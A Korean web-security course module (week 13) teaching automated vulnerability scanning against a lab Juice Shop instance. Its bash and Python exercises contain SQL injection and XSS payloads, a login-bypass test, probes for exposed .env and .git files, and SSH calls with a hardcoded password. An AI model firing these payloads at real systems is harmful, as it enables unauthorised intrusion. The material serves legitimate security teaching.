# Week 13: 자동화 점검 도구 활용

## 학습 목표
- OWASP ZAP을 사용한 자동 취약점 스캔을 수행한다
- nikto를 활용한 웹서버 보안 점검을 수행한다
- 자동화 도구의 한계와 수동 점검의 필요성을 이해한다
- 스캔 결과를 분석하고 오탐을 필터링한다

## 전제 조건
- Week 01~12 취약점 점검 기법 이해
- HTTP 프록시(Burp Suite, ZAP) 기본 사용법

---

## 1. 자동화 점검 도구 개요 (15분)

### 1.1 자동화 도구의 위치

```
수동 점검 (깊이) ◄────────────────────► 자동화 점검 (넓이)
  ├── 로직 취약점 발견        ├── 대량 URL 스캔
  ├── 비즈니스 로직 우회      ├── 알려진 패턴 매칭
  └── 체인 공격              └── 반복 점검 효율화
```

### 1.2 주요 자동화 도구 비교

| 도구 | 유형 | 라이선스 | 강점 |
|------|------|---------|------|
| OWASP ZAP | DAST (동적) | 오픈소스 | 무료, API, CI 연동 |
| Burp Suite Pro | DAST | 상용 | 정밀도, 확장성 |
| nikto | 웹서버 스캐너 | 오픈소스 | 빠른 설정 점검 |
| sqlmap | SQLi 특화 | 오픈소스 | SQL Injection 자동화 |
| Nuclei | 템플릿 기반 | 오픈소스 | 커스텀 템플릿 |

### 1.3 DAST vs SAST vs IAST

| 항목 | DAST | SAST | IAST |
|------|------|------|------|
| 분석 대상 | 실행 중인 앱 | 소스코드 | 런타임 + 코드 |
| 장점 | 실제 동작 검증 | 개발 초기 발견 | 정확도 높음 |
| 단점 | 코드 위치 모름 | 오탐 많음 | 에이전트 필요 |
| 이번 주 | 실습 대상 | - | - |

---

## 2. OWASP ZAP 기본 설정 (20분)

### 2.1 ZAP Docker 컨테이너 준비

```bash
# web 서버에서 ZAP 컨테이너 상태 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 \
  "docker ps -a | grep zap 2>/dev/null; echo '---'; which zaproxy 2>/dev/null || echo 'ZAP not installed locally'"

# ZAP이 없는 경우 Python ZAP 클라이언트로 API 모드 사용
# 여기서는 ZAP CLI/API 대신 커맨드라인 도구 조합으로 동일 효과 달성
```

### 2.2 대상 정보 수집 (스파이더링 대체)

```bash
# JuiceShop 엔드포인트 자동 수집 (API 기반 스파이더링)
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
echo "=== JuiceShop 엔드포인트 수집 ==="

# 메인 페이지에서 링크 추출
curl -s http://localhost:3000/ | grep -oP 'href="[^"]*"' | sort -u | head -20
echo "---"

# API 엔드포인트 탐색
for ep in rest/products search api/SecurityQuestions rest/user/whoami; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/$ep)
  echo "$ep -> $STATUS"
done

echo "---"

# Swagger/OpenAPI 문서 존재 확인
for path in api-docs swagger.json openapi.json; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/$path)
  echo "$path -> $STATUS"
done
ENDSSH
```

### 2.3 디렉토리 브루트포스

```bash
# 일반적인 관리 경로 점검
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
echo "=== 디렉토리/파일 존재 점검 ==="

PATHS=(
  "admin" "administrator" "console" "debug"
  "api" "api-docs" "swagger-ui" "graphql"
  ".env" ".git" "robots.txt" "sitemap.xml"
  "backup" "dump" "test" "staging"
  "wp-admin" "phpmyadmin" "server-status"
)

for p in "${PATHS[@]}"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -m 3 http://localhost:3000/$p)
  if [ "$CODE" != "404" ] && [ "$CODE" != "000" ]; then
    echo "[${CODE}] /$p"
  fi
done
ENDSSH
```

---

## 3. nikto 웹서버 점검 (25분)

### 3.1 nikto 기본 스캔

```bash
# nikto가 설치된 환경에서 실행 (또는 Docker)
# 여기서는 nikto 대체로 수동 헤더/설정 점검 수행

sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
echo "=== 웹서버 보안 헤더 점검 (nikto 스타일) ==="

# 응답 헤더 전체 수집
HEADERS=$(curl -sI http://localhost:3000/)
echo "$HEADERS"
echo "---"

# 보안 헤더 존재 여부 점검
echo "=== 보안 헤더 점검 ==="
for hdr in "X-Frame-Options" "X-Content-Type-Options" "X-XSS-Protection" \
           "Content-Security-Policy" "Strict-Transport-Security" \
           "Referrer-Policy" "Permissions-Policy"; do
  if echo "$HEADERS" | grep -qi "$hdr"; then
    VALUE=$(echo "$HEADERS" | grep -i "$hdr" | head -1)
    echo "[OK] $VALUE"
  else
    echo "[MISSING] $hdr"
  fi
done
ENDSSH
```

### 3.2 서버 정보 노출 점검

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
echo "=== 서버 정보 노출 점검 ==="

# Server 헤더
SERVER=$(curl -sI http://localhost:3000/ | grep -i "^server:")
echo "Server 헤더: ${SERVER:-'노출 없음'}"

# X-Powered-By 헤더
POWERED=$(curl -sI http://localhost:3000/ | grep -i "x-powered-by")
echo "X-Powered-By: ${POWERED:-'노출 없음'}"

# 에러 페이지에서 정보 노출
echo "---"
echo "=== 에러 페이지 정보 노출 ==="
curl -s http://localhost:3000/nonexistent-page-12345 | head -5

echo "---"
echo "=== 특수 경로 점검 ==="
# 흔한 정보 노출 경로
for path in ".git/HEAD" ".env" ".htaccess" "web.config" "package.json" \
            "Dockerfile" "docker-compose.yml"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/$path)
  if [ "$CODE" = "200" ]; then
    echo "[EXPOSED] /$path"
  fi
done
ENDSSH
```

### 3.3 HTTP 메서드 점검

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
echo "=== HTTP 메서드 점검 ==="

# OPTIONS 메서드로 허용 메서드 확인
ALLOW=$(curl -sI -X OPTIONS http://localhost:3000/ | grep -i "allow:")
echo "Allow: ${ALLOW:-'OPTIONS 응답 없음'}"

# 위험한 메서드 테스트
for method in PUT DELETE TRACE CONNECT PATCH; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -X $method http://localhost:3000/)
  echo "$method -> $CODE"
done
ENDSSH
```

---

## 4. sqlmap 자동화 SQL Injection 점검 (25분)

### 4.1 sqlmap 기본 사용법

```bash
# SQL Injection 점검 자동화 (sqlmap 스타일의 수동 점검)
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
echo "=== SQL Injection 자동 점검 ==="

# 1. 검색 파라미터 테스트
PAYLOADS=(
  "' OR '1'='1"
  "1 UNION SELECT 1,2,3--"
  "1' AND SLEEP(2)--"
  "1; DROP TABLE test--"
  "admin'--"
)

echo "--- 검색 엔드포인트 ---"
for payload in "${PAYLOADS[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:3000/rest/products/search?q=${ENCODED}")
  echo "Payload: $payload -> HTTP $CODE"
done

echo ""
echo "--- 로그인 엔드포인트 ---"
# 로그인 SQL Injection 테스트
for email in "' OR 1=1--" "admin'--" "' UNION SELECT 1,2,3,4,5,6,7,8,9--"; do
  RESULT=$(curl -s -X POST http://localhost:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$email\",\"password\":\"test\"}" | python3 -c "
import json,sys
try:
  d = json.load(sys.stdin)
  if 'authentication' in d:
    print('VULNERABLE - 로그인 성공')
  elif 'error' in str(d):
    print('차단됨')
  else:
    print(str(d)[:80])
except: print('파싱 오류')
" 2>/dev/null)
  echo "Email: $email -> $RESULT"
done
ENDSSH
```

### 4.2 자동 점검 스크립트 작성

```bash
# 종합 자동 점검 스크립트
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
cat << 'SCRIPT' > /tmp/auto_scan.sh
#!/bin/bash
TARGET="http://localhost:3000"
REPORT="/tmp/scan_report_$(date +%Y%m%d_%H%M%S).txt"

echo "=== 자동 취약점 점검 보고서 ===" > $REPORT
echo "대상: $TARGET" >> $REPORT
echo "일시: $(date)" >> $REPORT
echo "---" >> $REPORT

# 1. 보안 헤더 점검
echo "[1] 보안 헤더 점검" >> $REPORT
HEADERS=$(curl -sI $TARGET)
for hdr in "X-Frame-Options" "X-Content-Type-Options" "Content-Security-Policy" \
           "Strict-Transport-Security" "X-XSS-Protection"; do
  if echo "$HEADERS" | grep -qi "$hdr"; then
    echo "  [PASS] $hdr 존재" >> $REPORT
  else
    echo "  [FAIL] $hdr 누락" >> $REPORT
  fi
done

# 2. 정보 노출 점검
echo "[2] 정보 노출 점검" >> $REPORT
for path in ".git/HEAD" ".env" "package.json" "api-docs" "swagger.json"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" $TARGET/$path)
  if [ "$CODE" = "200" ]; then
    echo "  [FAIL] /$path 노출 (HTTP $CODE)" >> $REPORT
  else
    echo "  [PASS] /$path 비노출 (HTTP $CODE)" >> $REPORT
  fi
done

# 3. SQLi 기본 점검
echo "[3] SQL Injection 기본 점검" >> $REPORT
SQLI_RESP=$(curl -s -X POST $TARGET/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"x"}')
if echo "$SQLI_RESP" | grep -q "authentication"; then
  echo "  [CRITICAL] 로그인 SQLi 취약" >> $REPORT
else
  echo "  [PASS] 로그인 SQLi 차단" >> $REPORT
fi

# 4. XSS 반사형 점검
echo "[4] XSS 반사형 점검" >> $REPORT
XSS_RESP=$(curl -s "$TARGET/rest/products/search?q=<script>alert(1)</script>")
if echo "$XSS_RESP" | grep -q "<script>alert(1)</script>"; then
  echo "  [HIGH] 검색 XSS 반사 취약" >> $REPORT
else
  echo "  [PASS] 검색 XSS 필터링" >> $REPORT
fi

echo "---" >> $REPORT
echo "점검 완료: $(date)" >> $REPORT
cat $REPORT
SCRIPT

chmod +x /tmp/auto_scan.sh
bash /tmp/auto_scan.sh
ENDSSH
```

---

## 5. 스캔 결과 분석과 오탐 필터링 (20분)

### 5.1 오탐(False Positive) 판별 기준

| 판별 기준 | 정탐 가능성 높음 | 오탐 가능성 높음 |
|----------|----------------|----------------|
| 응답 변화 | 페이로드에 따라 응답 내용 변화 | 모든 입력에 동일 응답 |
| 에러 메시지 | DB 에러 메시지 노출 | 커스텀 에러 페이지 |
| 응답 시간 | 시간 기반 페이로드에 지연 발생 | 일정한 응답 시간 |
| 상태 코드 | 비정상 상태 코드 반환 | 항상 200 OK |

### 5.2 오탐 검증 실습

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
echo "=== 오탐 검증: 시간 기반 SQLi ==="

# 정상 요청 응답 시간 측정
NORMAL_TIME=$(curl -s -o /dev/null -w "%{time_total}" \
  "http://localhost:3000/rest/products/search?q=apple")
echo "정상 요청: ${NORMAL_TIME}s"

# 시간 기반 SQLi 페이로드
SQLI_TIME=$(curl -s -o /dev/null -w "%{time_total}" \
  "http://localhost:3000/rest/products/search?q=apple'+AND+SLEEP(3)--")
echo "SQLi 페이로드: ${SQLI_TIME}s"

# 판별
python3 -c "
normal = float('$NORMAL_TIME')
sqli = float('$SQLI_TIME')
diff = sqli - normal
print(f'응답 시간 차이: {diff:.2f}s')
if diff > 2.5:
    print('판정: 정탐 가능성 높음 (SLEEP 실행된 것으로 추정)')
else:
    print('판정: 오탐 가능성 높음 (응답 시간 차이 미미)')
"
ENDSSH
```

### 5.3 결과 정리 및 우선순위 분류

```bash
# 스캔 결과를 CVSS 기반으로 분류
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
python3 << 'PYEOF'
findings = [
    {"id": "V-001", "name": "SQL Injection (로그인)", "cvss": 9.8, "severity": "Critical"},
    {"id": "V-002", "name": "보안 헤더 누락 (CSP)", "cvss": 4.3, "severity": "Medium"},
    {"id": "V-003", "name": "서버 정보 노출", "cvss": 5.3, "severity": "Medium"},
    {"id": "V-004", "name": "package.json 노출", "cvss": 3.1, "severity": "Low"},
    {"id": "V-005", "name": "디버그 정보 노출", "cvss": 5.3, "severity": "Medium"},
]

findings.sort(key=lambda x: x["cvss"], reverse=True)

print(f"{'ID':<8} {'취약점':<30} {'CVSS':<6} {'심각도':<10}")
print("-" * 60)
for f in findings:
    print(f"{f['id']:<8} {f['name']:<30} {f['cvss']:<6} {f['severity']:<10}")

print(f"\n총 {len(findings)}건 발견")
print(f"  Critical: {sum(1 for f in findings if f['severity']=='Critical')}")
print(f"  High:     {sum(1 for f in findings if f['severity']=='High')}")
print(f"  Medium:   {sum(1 for f in findings if f['severity']=='Medium')}")
print(f"  Low:      {sum(1 for f in findings if f['severity']=='Low')}")
PYEOF
ENDSSH
```

---

## 6. Nuclei 템플릿 기반 점검 (20분)

### 6.1 Nuclei 스타일 커스텀 템플릿

```bash
# Nuclei YAML 템플릿 스타일의 점검 스크립트
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
python3 << 'PYEOF'
import json, subprocess, urllib.request, urllib.parse

TARGET = "http://localhost:3000"

# Nuclei 스타일 템플릿 정의
templates = [
    {
        "id": "exposed-gitconfig",
        "name": ".git/config 노출",
        "severity": "medium",
        "path": "/.git/config",
        "match_status": 200,
        "match_body": "[core]"
    },
    {
        "id": "exposed-env",
        "name": ".env 파일 노출",
        "severity": "high",
        "path": "/.env",
        "match_status": 200,
        "match_body": "="
    },
    {
        "id": "exposed-package-json",
        "name": "package.json 노출",
        "severity": "low",
        "path": "/package.json",
        "match_status": 200,
        "match_body": "dependencies"
    },
    {
        "id": "admin-panel",
        "name": "관리자 패널 접근",
        "severity": "high",
        "path": "/#/administration",
        "match_status": 200,
        "match_body": ""
    },
    {
        "id": "swagger-exposed",
        "name": "Swagger UI 노출",
        "severity": "medium",
        "path": "/api-docs",
        "match_status": 200,
        "match_body": ""
    },
]

print(f"{'템플릿 ID':<25} {'심각도':<10} {'결과':<10}")
print("-" * 50)

for t in templates:
    try:
        req = urllib.request.Request(TARGET + t["path"])
        resp = urllib.request.urlopen(req, timeout=5)
        code = resp.getcode()
        body = resp.read().decode("utf-8", errors="ignore")

        if code == t["match_status"]:
            if not t["match_body"] or t["match_body"] in body:
                print(f"{t['id']:<25} {t['severity']:<10} {'FOUND':<10}")
                continue
        print(f"{t['id']:<25} {t['severity']:<10} {'SAFE':<10}")
    except Exception as e:
        print(f"{t['id']:<25} {t['severity']:<10} {'SAFE':<10}")

PYEOF
ENDSSH
```

---

## 7. WAF 탐지와 우회 점검 (15분)

### 7.1 WAF 존재 여부 확인

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
echo "=== WAF 탐지 점검 ==="

# 1. 일반 요청 vs 악성 요청 응답 비교
echo "--- 일반 요청 ---"
curl -sI "http://localhost:3000/rest/products/search?q=apple" | head -3

echo "--- SQLi 페이로드 ---"
curl -sI "http://localhost:3000/rest/products/search?q=' OR 1=1--" | head -3

echo "--- XSS 페이로드 ---"
curl -sI "http://localhost:3000/rest/products/search?q=<script>alert(1)</script>" | head -3

# 2. BunkerWeb WAF 시그니처 확인
echo "---"
echo "=== BunkerWeb 응답 헤더 ==="
curl -sI http://localhost:3000/ | grep -iE "server|x-bunkerweb|modsecurity|x-waf"
ENDSSH
```

---

## 핵심 정리

1. OWASP ZAP, nikto, sqlmap은 취약점 자동 점검의 핵심 도구다
2. 자동 도구는 넓은 범위를 빠르게 점검하지만 로직 취약점은 놓친다
3. 오탐 판별은 응답 변화, 시간 차이, 에러 메시지를 기준으로 한다
4. Nuclei 스타일 템플릿으로 반복 가능한 점검을 구성할 수 있다
5. WAF가 있어도 우회 가능성을 항상 점검해야 한다
6. 자동 스캔 + 수동 검증의 조합이 최선의 점검 방법이다

---

## 다음 주 예고
- Week 14: 취약점 점검 보고서 작성법 - CVSS 점수, 재현 절차, 권고사항
